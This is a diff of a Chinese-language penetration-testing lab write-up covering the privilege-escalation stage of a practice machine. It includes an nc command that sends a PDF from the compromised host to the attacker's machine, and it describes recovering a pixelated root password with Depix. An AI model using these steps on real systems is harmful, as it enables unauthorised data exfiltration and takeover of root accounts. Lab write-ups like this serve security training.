@@ -142,40 +142,42 @@ zip revershell.zip revershell.php
 
 * 并且在之前读取user.txt文件时，在其/home目录下还发现了一个PDF文件：Using OpenVAS.pdf
 
+```bash
+# 将远程文件传输到Kali本地：
+nc 10.10.16.14 1234 < 'Using OpenVAS.pdf'
+nc -lvnp 1234 > usingOpenVAS.pdf
+```
 
+<figure><img src="../../.gitbook/assets/32.png" alt=""><figcaption></figcaption></figure>
 
+* 该pdf文件描述了只有root用户可以使用\`sudo /usr/sbin/openvas\`命令，并且附上了密码，不过该密码被打上了码：
 
+<figure><img src="../../.gitbook/assets/33.png" alt=""><figcaption></figcaption></figure>
 
+{% hint style="info" %}
+本例学习到了一个新工具：Depix，该工具是用于将打了码的模糊图像恢复成文本的工具。提供给该工具进行解析的图片文件不要用截图工具，直接将鼠标放在模糊的文本处，save image as...即可保存。
+{% endhint %}
 
+* Depix的使用方法在它的GitHub页面有说明 ：
 
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/34.png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
+* 运行Depix后解析出来了文本图片，该文本也就是root账户的明文密码，随后切换为root用户登录即可：
 
+<figure><img src="../../.gitbook/assets/35.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/36.png" alt=""><figcaption></figcaption></figure>
 
+* 重新连接一下：
 
+<figure><img src="../../.gitbook/assets/37.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/38.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-本例Get Shell阶段枚举、阅读源码和对各个上传点的尝试是重点，提权部分不算典型的OSCP机型，图像解析的部分更偏向于CTF。
+本例Get Shell阶段枚举、阅读源码和对各个上传点的尝试是重点，提权部分不算典型的OSCP机型，图像解析的部分更偏向于CTF。该机器确实不属于困难机器，只是之前没有遇到过将打码图片转换为清晰图像的情况。
 
 (本例机器中途重置过，IP地址有改变，但不影响其利用过程和实现结果)
 {% endhint %}
